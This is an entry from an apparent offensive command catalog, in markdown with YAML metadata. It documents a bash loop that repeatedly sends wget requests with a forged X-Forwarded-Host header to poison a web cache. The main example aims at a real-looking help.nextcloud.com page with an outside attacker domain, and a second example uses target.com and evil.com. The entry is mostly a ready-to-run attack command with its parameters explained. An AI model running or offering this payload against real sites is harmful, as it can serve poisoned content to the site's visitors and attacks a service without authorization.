---
data: >-
  while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379"
  --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO- >/dev/null; echo
  "poisoning...";done
tags:
  - web-cache-poisoning
  - loop
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 1d7a8793-1a9f-4c29-bbc4-a6e77b773998
created_at: '2025-12-13T09:00:34.113Z'
updated_at: '2025-12-13T09:00:34.113Z'
verified: false
validated: true
submitted: true
---
# wget-cache-poisoning-loop

## Command

```bash
while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO- >/dev/null; echo "poisoning...";done
```

## Description

Repeatedly sends HTTP GET requests to the target URL with a manipulated X-Forwarded-Host header to poison the web cache, looping indefinitely for persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `while true; do ... done` | Loops indefinitely to continuously send requests | Yes |
| `--header 'X-Forwarded-Host: cyberjutsu.io/#'` | Injects a malicious host value into the request header to manipulate the cached response | Yes |
| `-qO- >/dev/null` | Quiet mode, outputs response to stdout but redirects to /dev/null to discard it | Yes |

## Examples

### Basic Usage

```bash
while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO- >/dev/null; echo "poisoning...";done
```

### Advanced Usage

```bash
while true; do wget "https://target.com/path" --header 'X-Forwarded-Host: evil.com' -qO- >/dev/null; echo "poisoning..."; sleep 1; done
```

## Expected Output

No output expected as it's discarded; echoes 'poisoning...' for status after each request.

## Related

- [[procedures/Poison-Web-Cache-Using-X-Forwarded-Host]]
- [[tools/wget]]
